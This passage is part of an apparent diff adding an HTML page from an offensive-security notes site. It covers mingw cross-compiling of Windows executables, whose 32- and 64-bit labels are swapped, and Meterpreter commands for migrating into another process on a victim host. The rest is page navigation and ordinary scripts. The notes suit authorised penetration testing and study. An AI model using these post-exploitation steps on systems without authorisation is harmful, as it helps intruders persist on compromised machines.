+<li>64-bit # C++i686-w64-mingw32-g++ hello.cc -o hello32.exe    </li>
+<li>32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe   # 64-bit</li>
+</ul>
+<p>+ <strong>Migrate to a stable process.</strong><br />
+https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/<br />
+<strong>--&gt;</strong> "<em>Using the <strong>migrate</strong> post module, you can migrate to another process on the victim.</em>"<br />
+<strong>meterpreter&gt;</strong> run post/windows/manage/migrate<br />
+<strong>meterpreter&gt;</strong> migrate -h<br />
+<strong>meterpreter&gt;</strong> migrate <PID></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="WinPrivExploit.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next prefetch" href="KerberosCheetSheet.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="WinPrivExploit.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next prefetch" href="KerberosCheetSheet.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+
+    </div>
+    </body>
+</html>
